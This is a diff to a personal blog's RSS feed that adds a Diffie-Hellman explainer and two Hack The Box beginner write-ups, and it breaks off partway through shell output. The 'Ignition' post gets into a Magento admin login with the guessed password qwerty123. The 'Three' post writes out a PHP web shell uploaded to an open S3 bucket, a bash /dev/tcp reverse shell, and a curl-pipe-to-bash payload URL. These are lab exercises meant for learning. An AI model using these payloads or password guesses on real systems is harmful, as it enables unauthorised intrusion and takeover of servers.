@@ -8,8 +8,364 @@
     <language>en</language>
     <managingEditor>leewookb@gmail.com (Wook Lee)</managingEditor>
     <webMaster>leewookb@gmail.com (Wook Lee)</webMaster>
-    <lastBuildDate>Sat, 13 Jul 2024 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 15 Jul 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>[HTB] Ignition</title>
+      <link>http://localhost:1313/htb-ignition/</link>
+      <pubDate>Mon, 15 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/htb-ignition/</guid>
+      <description>Which service version is found to be running on port 80? nginx 1.14.2 What is the 3-digit HTTP status code returned when you visit http://{machine IP}/? 302 curl -v http://10.129.98.187
+What is the virtual host name the webpage expects to be accessed by? ignition.htb What is the full path to the file on a Linux computer that holds a local list of domain name to IP address pairs? /etc/hosts the ignition.</description>
+      <content:encoded><![CDATA[<h4 id="which-service-version-is-found-to-be-running-on-port-80">Which service version is found to be running on port 80?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>nginx 1.14.2</code></pre>
+<p><img src="image.png#center" alt="alt text"></p>
+<br>
+<h4 id="what-is-the-3-digit-http-status-code-returned-when-you-visit-httpmachine-ip">What is the 3-digit HTTP status code returned when you visit http://{machine IP}/?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>302</code></pre>
+<p><code>curl -v http://10.129.98.187</code></p>
+<p><img src="image-1.png#center" alt="alt text"></p>
+<br>
+<h4 id="what-is-the-virtual-host-name-the-webpage-expects-to-be-accessed-by">What is the virtual host name the webpage expects to be accessed by?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>ignition.htb</code></pre>
+<p><img src="image-2.png#center" alt="alt text"></p>
+<br>
+<h4 id="what-is-the-full-path-to-the-file-on-a-linux-computer-that-holds-a-local-list-of-domain-name-to-ip-address-pairs">What is the full path to the file on a Linux computer that holds a local list of domain name to IP address pairs?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>/etc/hosts</code></pre>
+<p>the <code>ignition.htb</code> address and its corresponding IP address is added to the file as an entry</p>
+<p><img src="image-3.png#center" alt="alt text"></p>
+<br>
+<h4 id="use-a-tool-to-brute-force-directories-on-the-webserver-what-is-the-full-url-to-the-magento-login-page">Use a tool to brute force directories on the webserver. What is the full URL to the Magento login page?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>http://ignition.htb/admin</code></pre>
+<p>I ran a gobuster to brute force directories on the web server and found that <code>/admin</code> url navigates us to the Magento login page.</p>
+<p><code>gobuster dir -u http://ignition.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p>
+<p><img src="image-4.png#center" alt="alt text"></p>
+<p><img src="image-5.png#center" alt="alt text"></p>
+<br>
+<h4 id="look-up-the-password-requirements-for-magento-and-also-try-searching-for-the-most-common-passwords-of-2023-which-password-provides-access-to-the-admin-account">Look up the password requirements for Magento and also try searching for the most common passwords of 2023. Which password provides access to the admin account?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>qwerty123</code></pre>
+<p>As you can see from the search result, Magento requires a minimum of seven chracters (both letters and numbers). From the list of most common passwords of 2023, only passwords that contain both letters and numbers are: <code>qwerty123</code> and <code>1q2w3e</code>. However, the latter has only 6 characters.</p>
+<p><code>username: admin, password: qwerty123</code>. The pair worked!</p>
+<p><img src="image-6.png#center" alt="alt text"></p>
+<br>
+<p><img src="image-7.png#center" alt="alt text"></p>
+<br>
+<p><img src="image-8.png#center" alt="alt text"></p>
+<br>
+<h4 id="submit-root-flag">Submit root flag</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>797d6c988d9dc5865e010b9410f247e0</code></pre>
+<p>I&rsquo;ve tried looking everywhere on the web page. It turned out the flag was on the main dashboard page. haha</p>
+<p><img src="image-10.png#center" alt="alt text"></p>
+<br>
+<p><img src="image-9.png#center" alt="alt text"></p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>[TIL] Key Exchange</title>
+      <link>http://localhost:1313/til-key-exchange/</link>
+      <pubDate>Mon, 15 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/til-key-exchange/</guid>
+      <description>What is a Key Exchange? A key exchange is a method used in cryptography to securely exchange cryptographic keys between two parties. These keys are then used to encrypt and decrypt messages, ensuring that the communication remains private and secure. The primary challenge in key exchange is to do this securely over an insecure communication channel, such as the internet.
+What is Diffie-Hellman Key Exchange? The Diffie-Hellman key exchange is one of the earliest and most widely used methods for securely exchanging cryptographic keys.</description>
+      <content:encoded><![CDATA[<h4 id="what-is-a-key-exchange">What is a Key Exchange?</h4>
+<p>A key exchange is a method used in cryptography to securely exchange cryptographic keys between two parties. These keys are then used to encrypt and decrypt messages, ensuring that the communication remains private and secure. The primary challenge in key exchange is to do this securely over an insecure communication channel, such as the internet.</p>
+<h4 id="what-is-diffie-hellman-key-exchange">What is Diffie-Hellman Key Exchange?</h4>
+<p>The Diffie-Hellman key exchange is one of the earliest and most widely used methods for securely exchanging cryptographic keys. It allows two parties to generate a shared secret over an insecure channel without having to transmit the secret itself.</p>
+<p><strong><em>Simplified example</em></strong>: Alice and Bob want to talk securely. They want to establish a common key, so they can use symmetric cryptography, but they don&rsquo;t want to use key exchange with asymmetric cryptography. This is where Diffie Hellman Key Exchange comes in.</p>
+<p>Alice and Bob both have secrets that they generate, let&rsquo;s call these <code>A</code> and <code>B</code>. They also have some common material that&rsquo;s public, let&rsquo;s call this <code>C</code>.</p>
+<p>Alice and Bob will combine their secrets with the common material and form <code>AC</code> and <code>BC</code>. They will then send these to each other, and combine that with their secrets to form two identical keys, both <code>ABC</code>. Now they can use this key to communicate.</p>
+<hr>
+<p>The <strong><em>Diffie-Hellman key exchange</em></strong> was explained in detail by the famous YouTube channel, <code>Computerphile</code>, in the following video:</p>
+
+
+    
+    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/NmM9HA2MQGI?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
+      ></iframe>
+    </div>
+
+]]></content:encoded>
+    </item>
+    <item>
+      <title>[HTB] Three</title>
+      <link>http://localhost:1313/htb-three/</link>
+      <pubDate>Sun, 14 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/htb-three/</guid>
+      <description>As I have mentioned earlier from the previous posting, I&amp;rsquo;ve finished all the boxes in Hack The Box Starting Point Tier 0 and have moved on to Tier 1 boxes. However, I feel a bit overwhelmed because the difficulty has suddenly increased a lot. To be clear, I want to mention that I will likely rely somewhat on the official write-ups provided by Hack The Box, including for this write-up and for future boxes.</description>
+      <content:encoded><![CDATA[<div style="text-align:center;"><img src="./sohard.gif"></div>
+<p>As I have mentioned earlier from the previous posting, I&rsquo;ve finished all the boxes in Hack The Box Starting Point Tier 0 and have moved on to Tier 1 boxes. However, I feel a bit overwhelmed because the difficulty has suddenly increased a lot. To be clear, I want to mention that I will likely rely somewhat on the official write-ups provided by Hack The Box, including for this write-up and for future boxes. As a beginner, it&rsquo;s quite challenging and time-consuming to complete boxes of this level without any assistance, so I&rsquo;ve concluded that it&rsquo;s better to get some help now and try to solve them on my own again later.</p>
+<hr>
+<h4 id="how-many-tcp-ports-are-open">How many TCP ports are open?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>2</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>/etc<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nmap -sC -sV --min-rate <span style="color:#fab387">3000</span> 10.129.92.176 -p-
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-14 23:11 EDT
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.92.176
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.033s latency<span style="color:#89dceb;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">65533</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>conn-refused<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>|   <span style="color:#fab387">2048</span> 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 <span style="color:#89dceb;font-weight:bold">(</span>RSA<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>|   <span style="color:#fab387">256</span> e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa <span style="color:#89dceb;font-weight:bold">(</span>ECDSA<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>|_  <span style="color:#fab387">256</span> 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 <span style="color:#89dceb;font-weight:bold">(</span>ED25519<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#89dceb;font-weight:bold">((</span>Ubuntu<span style="color:#89dceb;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>|_http-title: The Toppers
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>|_http-server-header: Apache/2.4.29 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 33.21 seconds</span></span></code></pre></div>
+<br>
+<h4 id="what-is-the-domain-of-the-email-address-provided-in-the-contact-section-of-the-website">What is the domain of the email address provided in the &ldquo;Contact&rdquo; section of the website?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>thetoppers.htb</code></pre>
+<p><img src="image.png#center" alt="alt text"></p>
+<br>
+<h4 id="in-the-absence-of-a-dns-server-which-linux-file-can-we-use-to-resolve-hostname-to-ip-addresses-in-order-to-be-able-to-access-the-websites-that-point-to-those-hostnames">In the absence of a DNS server, which Linux file can we use to resolve hostname to IP addresses in order to be able to access the websites that point to those hostnames?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>/etc/hosts</code></pre>
+<p>I added an entry for the <code>thetoppers.htb</code> in the <code>/etc/hosts</code> file with the corresponding IP address to be able to access this domain in the browser.
+<img src="image-1.png#center" alt="alt text"></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ <span style="color:#89dceb">echo</span> <span style="color:#a6e3a1">&#34;10.129.227.248 thetoppers.htb&#34;</span> | sudo tee -a /etc/hosts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>10.129.227.248 thetoppers.htb</span></span></code></pre></div>
+<br>
+<h4 id="which-sub-domain-is-discovered-during-further-enumeration">Which sub-domain is discovered during further enumeration?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>s3.thetoppers.htb</code></pre>
+<p><strong><em>A subdomain</em></strong> name is a piece of additional information added to the beginning of a website&rsquo;s domain name. It allows websites to separate and organize content for a specific function. i.e. <code>ctf.hackthebox.com</code>. In this case, <code>ctf</code> is the subdomain, <code>hackthebox</code> is the primary domain and <code>com</code> is the top-level domain (TLD).</p>
+<p>Often, different subdomains will have different IP addresses. It is also possible to have one server handle multiple subdomains. This is accomplished via <code>host-based routing</code> or <code>virtual host routing</code>, where the server uses the Host header in the HTTP request to determine which application is meant to handle the request.</p>
+<p>Let&rsquo;s enumerate for any other sub-domains that may be present on the same server. Tools like <code>gobuster</code>, <code>wfuzz</code>, <code>feroxbuster</code>, and etc. are avilable for this purpose.</p>
+<p>I used the <code>gobuster</code> to enumerate for sub-domains by running the following command:</p>
+<p><code>gobuster vhost --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb</code></p>
+<p>The output:</p>
+<p><img src="image-2.png#center" alt="alt text"></p>
+<p>Let&rsquo;s also add the <code>s3.thetoppers.htb</code> entry in the <code>/etc/hosts</code> file.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ <span style="color:#89dceb">echo</span> <span style="color:#a6e3a1">&#34;10.129.92.176 s3.thetoppers.htb&#34;</span> | sudo tee -a /etc/hosts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#89dceb;font-weight:bold">[</span>sudo<span style="color:#89dceb;font-weight:bold">]</span> password <span style="color:#cba6f7">for</span> kali:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>10.129.92.176 s3.thetoppers.htb</span></span></code></pre></div>
+<br>
+<h4 id="which-service-is-running-on-the-discovered-sub-domain">Which service is running on the discovered sub-domain?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>Amazon S3</code></pre>
+<p>I navigated to the newly found subdomain url and the only thing it shows is one JSON: <code>{&quot;status&quot;: &quot;running}</code>
+<img src="image-3.png#center" alt="alt text"></p>
+<p>Having researched about <code>s3 subdomain status running</code>, I found that <code>s3</code> is a cloud-based object storage service hosted by Amazon Web Services. It allows us to store things in containers called buckets. We can interact with the S3 bucket with the aid of the <code>awscli</code> utility.</p>
+<br>
+<h4 id="which-command-line-utility-can-be-used-to-interact-with-the-service-running-on-the-discovered-sub-domain">Which command line utility can be used to interact with the service running on the discovered sub-domain?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>awscli</code></pre>
+<p>First we need to configure it using the command, <code>aws configure</code> and then I used an arbitrary value, temp, for all the fields.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ aws configure
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>AWS Access Key ID <span style="color:#89dceb;font-weight:bold">[</span>None<span style="color:#89dceb;font-weight:bold">]</span>: temp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>AWS Secret Access Key <span style="color:#89dceb;font-weight:bold">[</span>None<span style="color:#89dceb;font-weight:bold">]</span>: temp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>Default region name <span style="color:#89dceb;font-weight:bold">[</span>None<span style="color:#89dceb;font-weight:bold">]</span>: temp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>Default output format <span style="color:#89dceb;font-weight:bold">[</span>None<span style="color:#89dceb;font-weight:bold">]</span>: temp</span></span></code></pre></div>
+<p>We can list all of the S3 buckets hosted by the server by using the <code>ls</code> command.</p>
+<p><code>aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</code></p>
+<p><img src="image-4.png#center" alt="alt text"></p>
+<br>
+<h4 id="which-command-is-used-to-set-up-the-aws-cli-installation">Which command is used to set up the AWS CLI installation?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>aws configure</code></pre>
+<br>
+<h4 id="what-is-the-command-used-by-the-above-utility-to-list-all-of-the-s3-buckets">What is the command used by the above utility to list all of the S3 buckets?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>aws s3 ls</code></pre>
+<br>
+<h4 id="this-server-is-configured-to-run-files-written-in-what-web-scripting-language">This server is configured to run files written in what web scripting language?</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>PHP</code></pre>
+<p>As we can see from the <code>ls</code> command output, we see the files <code>index.php</code>, <code>.htaccess</code>, and a directory called <code>images</code> in the specified bucket. Therefore, we know the website server is using PHP.</p>
+<p><img src="image-5.png#center" alt="alt text"></p>
+<br>
+<h4 id="submit-root-flag">Submit root flag</h4>
+
+
+
+
+
+
+<pre tabindex="0"><code>a980d99281a28d638ac68b9bf9453c2b</code></pre>
+<p><code>awscli</code> has another feature that allows us to copy files to a remote bucket. We can try uploading a PHP shell file to the s3 bucket and since it&rsquo;s uploaded to the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we will achieve remote code execution.</p>
+<p>We can use the following PHP one-liner which takes the URL parameter <code>cmd</code> as an input and executes it as a system command.</p>
+<p><code>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code></p>
+<p>Let&rsquo;s create a PHP file to upload</p>
+<p><code>echo '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php</code></p>
+<p>Then, we can upload this PHP shell to the <code>thetoppers.htb</code> S3 bucket using the following command:</p>
+<p><code>aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb</code></p>
+<p><img src="image-6.png#center" alt="alt text"></p>
+<br>
+<p>We can confirm that our shell is uploaded by navigating to <code>http://thetoppers.htb/shell.php</code>.</p>
+<p>I tried executing the OS command <code>id</code> using the URL parameter cmd.
+The response from the server contains the output of the OS command, id, which verified that we have code execution on the box.</p>
+<p><img src="image-7.png#center" alt="alt text"></p>
+<br>
+<p>Now let&rsquo;s get a reverse shell creating a new file <code>shell.sh</code> containing the following bash reverse shell payload which will connect back to our local machine on port <code>1337</code>.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#6c7086;font-style:italic">#!/bin/bash
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#6c7086;font-style:italic"></span>bash -i &gt;&amp; /dev/tcp/10.10.14.28/1337 0&gt;&amp;<span style="color:#fab387">1</span></span></span></code></pre></div>
+<p>And also start a <code>netcat</code> listener on our local port 1337 using the following command:</p>
+<p><code>nc lvnp 1337</code></p>
+<p>Let&rsquo;s also start a web server on our local machine on <code>port 8000</code> and host this bash file. It is crucial to note here that this command for hosting the web server <strong><em>must be run from the directory which contains the reverse shell file</em></strong>. So we must first traverse to the appropriate directory and then run the followign command:</p>
+<p><code>python3 -m http.server 8000</code></p>
+<br>
+<p>We can use the <code>curl</code> utility to fetch the bash reverse shell file from our local host and then pipe it to <code>bash</code> in order to execute it.
+Let&rsquo;s visit the following URL containing the payload in the browser.</p>
+<p><code>http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.28:8000/shell.sh|bash</code></p>
+<br>
+<p>After we had run the payload, we were able to receive a reverse shell on the netcat terminal window.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nc -nvlp <span style="color:#fab387">1337</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1337</span> ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.10.14.28<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.129.92.176<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">41006</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>bash: cannot <span style="color:#89dceb">set</span> terminal process group <span style="color:#89dceb;font-weight:bold">(</span>1541<span style="color:#89dceb;font-weight:bold">)</span>: Inappropriate ioctl <span style="color:#cba6f7">for</span> device
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>www-data@three:/var/www/html$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>images
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>index.php
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>shell.php
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>www-data@three:/var/www/html$ <span style="color:#89dceb">cd</span> ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb">cd</span> ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>www-data@three:/var/www$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>html
